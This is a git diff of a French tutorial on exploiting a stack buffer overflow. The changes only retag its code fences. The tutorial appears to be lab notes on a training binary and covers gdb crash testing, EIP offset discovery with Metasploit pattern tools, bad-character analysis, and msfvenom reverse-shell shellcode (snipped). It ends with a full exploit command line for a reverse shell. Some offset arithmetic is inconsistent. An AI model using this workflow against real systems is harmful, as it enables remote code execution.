@@ -2,7 +2,7 @@ n**Take Controle of EIP**
 
 Avec `gdb`, envoyer un nombre important de 'A' au programme jusqu'a obtenir une erreur soit (`SIGSEGV, Segementation fault`)
 
-```c
+```sh
 (gdb) run AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 (gdb) run $(python2 -c "print 'A' * 1200")
 ```
@@ -15,19 +15,19 @@ A partir des informations du registre `info registers`, verifier que nous avons 
 
 Maintenant il faut chercher le `offset` c'est la taille exact qu'il faut pour écrasé sur `EIP`
 
-```c
+```sh
 msf-pattern_create -l 100
 ```
 
 Executer la sortie de la commande dans `gdb` 
 
-```c
+```sh
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4A...
 ```
 
 Verifier que `EIP` a une nouvelle valeur, prendre cette valeur et trouver l'`offset` correspondant.
 
-```c
+```sh
 msf-pattern_offset -q {EIP_VALUE}
 ```
 
@@ -41,14 +41,14 @@ Apres avoir trouver l'`offset` , nous devons maintenant découvrir de combien d�
 
 nous avons besoin de :
 
-```c
+```sh
    Buffer = "A" * (offset - 100 - 150 - 4)
      NOPs = "\x90" * 4
 Shellcode = "\x44" * 50
       EIP = "\x66" * 4
 ```
 
-```c
+```sh
 (gdb) run $(python2 -c 'print "A" * (54 - 100 - 150 - 4) + "\x90" * 4 + "B" * 50 + "\x66" * 4')
 ```
 
@@ -72,7 +72,7 @@ echo $CHARS | sed 's/\\x/ /g' | wc -w
 
 Nous devons donc recalculer notre tampons
 
-```c
+```sh
 Buffer = "A" * (offset - 256 - 4)
  CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
    EIP = "\x66" * 4
@@ -80,7 +80,7 @@ Buffer = "A" * (offset - 256 - 4)
 
 Maintenant il faut mettre un point d'arrêt au niveau de la fonction vulnerable pour que l'exécution s'arrête à ce stade, et nous puissions analyser le contenu de la mémoire.
 
-```c
+```sh
 (gdb) break bowfunc 
 
 Breakpoint 1 at 0x56555551
@@ -88,13 +88,13 @@ Breakpoint 1 at 0x56555551
 
 Maintenant, nous pouvons exécuter l’entrée nouvellement créée et consulter la mémoire.
 
-```c
+```sh
 (gdb) run $(python2 -c 'print "A" * (54 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
 ```
 
 Après avoir exécuté notre tampon avec les mauvais caractères et atteint le point d'arrêt, nous pouvons examiner la pile.
 
-```c
+```sh
 (gdb) x/2000xb $esp+500
 ```
 
@@ -115,20 +115,20 @@ Ces caractères noter sera notre `bad characters`
 
 **Generating Shellcode**
 
-```c
+```sh
 msfvenom --platform linux -a x86 -p linux/x86/shell_reverse_tcp lhost=127.0.0.1 lport=4444 -f c -b "<badchars>" -o shellcode.c
 ```
 
 Maintenant que nous avons notre shellcode, nous l'ajustons pour n'avoir qu'une seule chaîne, puis nous pouvons adapter et soumettre à nouveau notre simple exploit.
 
-```c
+```sh
    Buffer = "A" * (offset - 124 - 95 - 4)
      NOPs = "\x90" * 4
 Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
       EIP = "\x66" * 4
 ```
 
-```c
+```sh
 (gdb) run $(python -c 'print "\x55" * (offset - 124 - 95 - 4) + "\x90" * 4 + "\xda\xca\xba\xe4...<SNIP>...\xad\xec\xa0\x04\x5a\x22\xa2" + "\x66" * 4')
 ```
 
@@ -136,7 +136,7 @@ Ensuite, nous vérifions si les premiers octets de notre shellcode correspondent
 
 Aller a la fin des `NOPs` et obsever le debut du shellcode
 
-```c
+```sh
 (gdb) x/2000xb $esp+550
 ```
 
@@ -148,7 +148,7 @@ Après avoir vérifié que nous contrôlons toujours l'EIP avec notre shellcode,
 
 Cette adresse mémoire ne doit contenir aucun des mauvais caractères que nous avons trouvés précédemment.
 
-```c
+```sh
 (gdb) x/2000xb $esp+1400
 # 0xffffd644: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
 # 0xffffd64c: 0x90  0x90  0x90  0x90  0x90  0x90  0x90  0x90
@@ -162,7 +162,7 @@ Après avoir sélectionné une adresse mémoire, nous remplaçons notre " `\x66
 
 Notez que la saisie de l'adresse selectionner est saisie à l'envers.
  
-```c
+```sh
    Buffer = "A" * (offset - 100 - 95 - 4)
      NOPs = "\x90" * 4
 Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
@@ -171,7 +171,7 @@ Shellcode = "\xda\xca\xba\xe4\x11...<SNIP>...\x5a\x22\xa2"
 
 > **Executer le programme pour obtenir un reverse shell**
 
-```c
+```sh
 (gdb) run $(python -c 'print "\x55" * (1040 - 100 - 95 - 4) + "\x90" * 100 + "\xda\xca\xba...<SNIP>...\x5a\x22\xa2" + "\x4c\xd6\xff\xff"')
 ```
 
